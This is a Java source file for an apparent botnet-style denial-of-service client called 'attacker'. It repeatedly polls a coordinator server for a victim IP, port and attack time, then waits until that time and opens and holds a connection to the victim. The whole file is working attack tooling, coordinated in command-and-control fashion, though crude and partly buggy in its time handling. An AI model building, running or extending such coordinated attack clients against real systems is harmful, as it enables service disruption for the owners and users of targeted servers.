import java.net.*;
import java.io.*;
import java.util.*;
import java.nio.*;
import java.text.SimpleDateFormat;

public class attacker {

  //internal states of attacker.
  private final int MONITORING = 0;
  private final int ATTACKING = 1;

  private static int state = 0;

  private static String victim_time = "";
  private static String victim_ip = "";
  private static String victim_port = "";

  public static String coordinator_ip_string = "127.0.0.1";
  private static int coordinator_port = 2337;

  private boolean retry_connection_to_coordinator = false;

  private static Calendar convertStringToTime(String time) {
    SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    Calendar now = Calendar.getInstance();
    try {
      sf = new SimpleDateFormat("HH:mm:ss");
      sf.setTimeZone(TimeZone.getTimeZone("EST"));
      /*
        store reference to year/month/day because just setting the time always
        sets it to jan 01 1970...
      */
      int current_year = now.get(Calendar.YEAR);
      int current_day = now.get(Calendar.DAY_OF_MONTH);
      int current_month = now.get(Calendar.MONTH);
      now.setTime(sf.parse(time));
      now.set(current_year, current_month, current_day);
      now.add(0, 10);
      //System.out.println((now.get(Calendar.ZONE_OFFSET) + now.get(Calendar.DST_OFFSET)) / (60 * 1000));
    } catch (Exception e) {}
    return now;
  }

  private static String addSecondsToTime(String seconds) {
    return null;
  }

  /*
    Constantly check if an attack server is online.
  */
  private static void waitForAttackServer() {
    int waiting_time = 1 * 1000;
    while (true) {
      try (Socket s = new Socket(coordinator_ip_string, coordinator_port)) {
        s.close();
        return;
      } catch (IOException e) {}
      System.out.println("Coordinating Server not online, retrying in " + (waiting_time/1000) + " seconds");
      try { Thread.sleep(waiting_time); } catch (Exception e) {}
    }
  }

  /*
    Wait until the attack time is here.
  */
  private static void waitForAttackTime() {
    int waiting_time = 1 * 1000;
    while (true) {
      //will return negative one, if desired time , has passed.
      int i = convertStringToTime(victim_time).compareTo(Calendar.getInstance());
      if (i == -1) {
        return;
      }
      System.out.println("Waiting for the right time to attack.");
      try { Thread.sleep(waiting_time); } catch (Exception e) {}
    }
  }

  /*
    get the required information from the attack server before attacking.
  */
  private static void getInfoFromCoordinator() throws UnknownHostException{
    Inet4Address coordinator_ip_inet = (Inet4Address) Inet4Address.getByAddress(convertStringToByteArrayIP(coordinator_ip_string));
    Socket socket;

    try {
      socket = new Socket(coordinator_ip_inet, coordinator_port);
      PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
      BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

      BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
      String fromServer;
      String fromUser;

      int state = 0;
      while ((fromServer = in.readLine()) != null) {
        if (state == 0) {}
        else if (state == 1) {
          victim_ip = fromServer;
        } else if (state == 2) {
          victim_port = fromServer;
        } else if (state == 3) {
          victim_time = fromServer;
        }
        state++;
        if (fromServer.equals("Bye.")) {
          out.println("Bye.");
          break;
        }
      }
      System.out.println("Target acquired: " + victim_ip + ", " + victim_port + ", " + victim_time);
    } catch (IOException e) {}
  }


  private static void attackServer() {
    Inet4Address server_ip_inet;
    Socket socket;
    try {
      server_ip_inet = (Inet4Address) Inet4Address.getByAddress(convertStringToByteArrayIP(victim_ip));
    } catch (Exception e) {
      System.out.println("Invalid Host name");
      return;
    }

    try {
      socket = new Socket(server_ip_inet, Integer.parseInt(victim_port));
      while (socket.getInputStream().read() != -1 ){}
      socket.close();
      System.out.println("Socket was closed");
    } catch (IOException e) {
      System.err.println("Couldn't get I/O for the connection to " + victim_ip + " on port " + victim_port );
      System.exit(1);
    }
  }

  private static byte[] convertStringToByteArrayIP(String string_IP) {
    String[] ip_parts = string_IP.split("\\.");
    if (ip_parts.length != 4) {
      return null;
    }
    byte[] final_byte_array = new byte[4];
    for (int i = 0 ; i < 4 ; i++) {
      final_byte_array[i] = (byte)Integer.parseInt(ip_parts[i]);
    }
    return final_byte_array;
  } //end convertStringToByteArrayIP()

  private static void startAttack() {
    waitForAttackTime();
    System.out.println("opening connection to victim server.");
    attackServer();
  }

  private static void startMonitor() {
    waitForAttackServer();
    try {
      getInfoFromCoordinator();
    } catch (Exception e) {}
  }

  public static void main(String[] args) throws IOException {
    //two modes, monitoring mode, and attacking mode.
    //monitoring mode
      //get the information from the coordinator
      //parse information, including converting the IP to a byte array.
    //attack mode.

    while (true) {
      startMonitor();
      startAttack();
      try { Thread.sleep(60000); } catch (Exception e) {} //time to wait before trying to get new attack
    }
  }
}
